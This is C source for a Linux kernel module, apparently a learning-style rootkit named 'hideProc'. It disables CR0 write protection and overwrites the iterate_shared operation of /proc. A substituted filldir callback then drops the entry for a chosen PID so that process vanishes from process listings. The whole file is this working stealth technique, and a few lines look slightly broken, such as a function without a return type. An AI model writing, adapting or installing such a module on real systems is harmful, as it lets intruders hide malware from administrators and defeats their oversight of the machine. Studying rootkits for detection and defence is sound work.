#include <linux/kobject.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <linux/seq_file.h>
#include <linux/dirent.h>
#include <linux/unistd.h>
#include <linux/file.h>
#include <linux/errno.h>
#include <linux/string.h>

#define ROOT_PATH "/proc"
#define SECRET_PROC 1

#define set_f_op(op,path,new,old)										\
	do{																	\
    	struct file_operations *f_op; 									\
    	struct file *filp = filp_open(path,O_RDONLY,0); 				\
    	if(IS_ERR(filp)){ 												\
        	printk("LKM5:Failed open\n");								\
        	old = NULL;													\
    	}else{															\
			printk("LKM5:Success open");								\
			f_op = (struct file_operations *)filp->f_op;				\
			old = f_op->op;												\
			printk("LKM5:Changing its iterate\n");						\
			disable_write_protection();									\
        	f_op->op = new;												\
        	enable_write_protection();									\
    	}																\
	}while(0)



int (*real_iterate)(struct file *filp,struct dir_context *ctx);
int (*real_filldir)(struct dir_context *ctx,const char *name,int namlen,loff_t offset, u64 ino, unsigned d_type);

int fake_iterate(struct file *filp,struct dir_context *ctx);
int fake_filldir(struct dir_context *ctx,const char *name, int namlen,loff_t offset, u64 ino, unsigned d_type);

inline mywrite_cr0(unsigned long cr0){
	asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

void disable_write_protection(void){
    unsigned long cr0;
    preempt_disable();
    cr0 = read_cr0();
    clear_bit(16,&cr0);
    write_cr0(cr0);
    printk("LKM5:disable Write Protection success\n");
    preempt_enable();
    return;
}

void enable_write_protection(void){
    unsigned long cr0;
    preempt_disable();
    cr0 = read_cr0();
    set_bit(16,&cr0);
    write_cr0(cr0);
    preempt_enable();
    printk("LKM5:enable Write Protection success\n");
    return;
}




static int lkm_init(void){
    
    printk("LKM5:hideProc module loaded!\n");

	//new version kernel    iterate change to iterate_shared
    set_f_op(iterate_shared,ROOT_PATH,fake_iterate,real_iterate);
    
    if(!real_iterate){
        return -ENOENT;
    }
    return 0;
}

static void lkm_exit(void){
    if(real_iterate){
        void *dummy;
        set_f_op(iterate_shared,ROOT_PATH,real_iterate,dummy);
    }

    printk("LKM5:hideProc module removed\n");

}

int fake_iterate(struct file *filp,struct dir_context *ctx){
    real_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_filldir;
    return real_iterate(filp,ctx);
}


int fake_filldir(struct dir_context *ctx,const char *name, int namlen,loff_t offset, u64 ino,unsigned d_type){
    char *endname;
    long pid = simple_strtol(name,&endname,10);
    if(pid==SECRET_PROC){
        printk("LKM5:Proc %d hided\n",SECRET_PROC);
        return 0;
    }
    return real_filldir(ctx,name,namlen,offset,ino,d_type);
}





module_init(lkm_init);
module_exit(lkm_exit);

MODULE_LICENSE("GPL");
